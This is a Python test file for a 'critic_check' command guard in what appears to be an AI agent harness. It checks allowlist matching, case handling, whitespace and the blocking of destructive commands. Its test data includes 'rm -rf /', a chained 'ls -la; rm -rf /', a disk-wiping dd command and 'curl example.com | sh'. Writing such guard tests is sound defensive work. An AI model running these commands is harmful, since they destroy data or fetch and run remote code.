#!/usr/bin/env python3
"""Test edge cases for the critic_check function from src/harness.py"""

import sys
import os
sys.path.insert(0, 'src')

from harness import critic_check

def test_git_command_variations():
    """Test that git commands are handled correctly."""
    print("Testing git command variations...")
    
    # "git status" is in the allowlist
    allowed, reason = critic_check("git status", "allowlist")
    assert allowed, f"git status should be allowed: {reason}"
    assert "allowlist match" in reason, f"Unexpected reason: {reason}"
    
    # "git" alone is NOT in the allowlist (only "git status", "git log", "git diff")
    allowed, reason = critic_check("git", "allowlist")
    assert not allowed, f"git alone should NOT be allowed: {reason}"
    assert "not in allowlist" in reason, f"Unexpected reason: {reason}"
    
    # "git add" is NOT in the allowlist
    allowed, reason = critic_check("git add file.txt", "allowlist")
    assert not allowed, f"git add should NOT be allowed: {reason}"
    assert "not in allowlist" in reason, f"Unexpected reason: {reason}"
    
    # "git log" is in the allowlist
    allowed, reason = critic_check("git log", "allowlist")
    assert allowed, f"git log should be allowed: {reason}"
    
    # "git diff" is in the allowlist
    allowed, reason = critic_check("git diff", "allowlist")
    assert allowed, f"git diff should be allowed: {reason}"
    
    # "git diff HEAD~1" should be allowed (starts with "git diff")
    allowed, reason = critic_check("git diff HEAD~1", "allowlist")
    assert allowed, f"git diff with args should be allowed: {reason}"
    
    print("✓ test_git_command_variations passed")

def test_case_sensitivity():
    """Test case sensitivity of commands."""
    print("Testing case sensitivity...")
    
    # Commands should be case-sensitive (implementation uses exact string matching)
    allowed, reason = critic_check("LS", "allowlist")
    assert not allowed, f"Uppercase LS should NOT be allowed: {reason}"
    
    allowed, reason = critic_check("Ls", "allowlist")
    assert not allowed, f"Mixed case Ls should NOT be allowed: {reason}"
    
    allowed, reason = critic_check("ls", "allowlist")
    assert allowed, f"Lowercase ls should be allowed: {reason}"
    
    allowed, reason = critic_check("Python script.py", "allowlist")
    assert not allowed, f"Uppercase Python should NOT be allowed: {reason}"
    
    allowed, reason = critic_check("python script.py", "allowlist")
    assert allowed, f"Lowercase python should be allowed: {reason}"
    
    print("✓ test_case_sensitivity passed")

def test_command_with_arguments():
    """Test commands with various arguments."""
    print("Testing commands with arguments...")
    
    # Commands with arguments should be allowed if the base command is in allowlist
    allowed, reason = critic_check("ls -la", "allowlist")
    assert allowed, f"ls with args should be allowed: {reason}"
    
    allowed, reason = critic_check("ls -la /home/user", "allowlist")
    assert allowed, f"ls with more args should be allowed: {reason}"
    
    allowed, reason = critic_check("python -c 'print(\"hello\")'", "allowlist")
    assert allowed, f"python with args should be allowed: {reason}"
    
    allowed, reason = critic_check("python3 script.py --verbose", "allowlist")
    assert allowed, f"python3 with args should be allowed: {reason}"
    
    # Edge case: command that starts with safe prefix but has dangerous pattern
    allowed, reason = critic_check("ls -la; rm -rf /", "allowlist")
    assert not allowed, f"Command with dangerous pattern should be blocked: {reason}"
    assert "BLOCKED" in reason, f"Should mention BLOCKED: {reason}"
    
    print("✓ test_command_with_arguments passed")

def test_empty_and_whitespace():
    """Test empty and whitespace-only commands."""
    print("Testing empty and whitespace commands...")
    
    # Empty string
    allowed, reason = critic_check("", "allowlist")
    assert not allowed, f"Empty command should NOT be allowed: {reason}"
    assert "not in allowlist" in reason, f"Unexpected reason: {reason}"
    
    # Whitespace only
    allowed, reason = critic_check("   ", "allowlist")
    assert not allowed, f"Whitespace-only command should NOT be allowed: {reason}"
    
    allowed, reason = critic_check("\t\n  ", "allowlist")
    assert not allowed, f"Whitespace with tabs/newlines should NOT be allowed: {reason}"
    
    # Leading/trailing whitespace
    allowed, reason = critic_check("  ls  ", "allowlist")
    assert allowed, f"ls with whitespace should be allowed: {reason}"
    
    allowed, reason = critic_check("\tls -la\n", "allowlist")
    assert allowed, f"ls with tabs/newlines should be allowed: {reason}"
    
    print("✓ test_empty_and_whitespace passed")

def test_invalid_critic_modes():
    """Test behavior with invalid critic modes."""
    print("Testing invalid critic modes...")
    
    # Invalid mode should default to allow
    allowed, reason = critic_check("ls", "invalid_mode")
    assert allowed, f"Invalid mode should default to allow: {reason}"
    assert "default allow" in reason, f"Unexpected reason: {reason}"
    
    allowed, reason = critic_check("touch file.txt", "invalid_mode")
    assert allowed, f"Invalid mode should allow any non-dangerous command: {reason}"
    
    # Dangerous command should still be blocked even with invalid mode
    allowed, reason = critic_check("rm -rf /", "invalid_mode")
    assert not allowed, f"Dangerous command should be blocked even with invalid mode: {reason}"
    assert "BLOCKED" in reason, f"Should mention BLOCKED: {reason}"
    
    # Test None mode (should use default)
    allowed, reason = critic_check("ls")  # Default mode is "allowlist"
    assert allowed, f"Default mode should be allowlist: {reason}"
    
    allowed, reason = critic_check("touch file.txt")  # Default mode is "allowlist"
    assert not allowed, f"Default mode should block non-allowlist commands: {reason}"
    
    print("✓ test_invalid_critic_modes passed")

def test_partial_matches():
    """Test partial matches in the allowlist."""
    print("Testing partial matches...")
    
    # "lsof" starts with "ls" so should be allowed
    allowed, reason = critic_check("lsof", "allowlist")
    assert allowed, f"lsof should be allowed (starts with ls): {reason}"
    
    # "pythonic" starts with "python" so should be allowed
    allowed, reason = critic_check("pythonic", "allowlist")
    assert allowed, f"pythonic should be allowed (starts with python): {reason}"
    
    # "catfish" starts with "cat" so should be allowed
    allowed, reason = critic_check("catfish", "allowlist")
    assert allowed, f"catfish should be allowed (starts with cat): {reason}"
    
    # "echoes" starts with "echo" so should be allowed
    allowed, reason = critic_check("echoes", "allowlist")
    assert allowed, f"echoes should be allowed (starts with echo): {reason}"
    
    # But "gitstatus" (no space) does NOT start with "git status" (has space)
    allowed, reason = critic_check("gitstatus", "allowlist")
    assert not allowed, f"gitstatus should NOT be allowed: {reason}"
    
    print("✓ test_partial_matches passed")

def test_off_mode_behavior():
    """Test off mode allows everything except dangerous patterns."""
    print("Testing off mode behavior...")
    
    # Off mode should allow any non-dangerous command
    test_commands = [
        "touch file.txt",
        "mkdir dir",
        "cp src dst",
        "mv old new",
        "rm file.txt",  # Note: rm alone is not dangerous, only rm -rf /
        "sudo apt update",
        "arbitrary command with spaces",
        "echo 'test' > file.txt",
    ]
    
    for cmd in test_commands:
        allowed, reason = critic_check(cmd, "off")
        assert allowed, f"Off mode should allow: {cmd} - reason: {reason}"
        assert "critic disabled" in reason, f"Unexpected reason: {reason}"
    
    # But dangerous commands should still be blocked
    dangerous = ["rm -rf /", "dd if=/dev/zero of=/dev/sda", "curl example.com | sh"]
    for cmd in dangerous:
        allowed, reason = critic_check(cmd, "off")
        assert not allowed, f"Off mode should still block dangerous: {cmd}"
        assert "BLOCKED" in reason, f"Should mention BLOCKED: {reason}"
    
    print("✓ test_off_mode_behavior passed")

def run_all_tests():
    """Run all test functions."""
    test_functions = [
        test_git_command_variations,
        test_case_sensitivity,
        test_command_with_arguments,
        test_empty_and_whitespace,
        test_invalid_critic_modes,
        test_partial_matches,
        test_off_mode_behavior,
    ]
    
    passed = 0
    failed = 0
    
    for test_func in test_functions:
        try:
            test_func()
            passed += 1
            print(f"✓ {test_func.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"✗ {test_func.__name__} failed: {e}")
        except Exception as e:
            failed += 1
            print(f"✗ {test_func.__name__} error: {e}")
    
    print(f"\nTotal: {passed} passed, {failed} failed")
    return failed == 0

if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)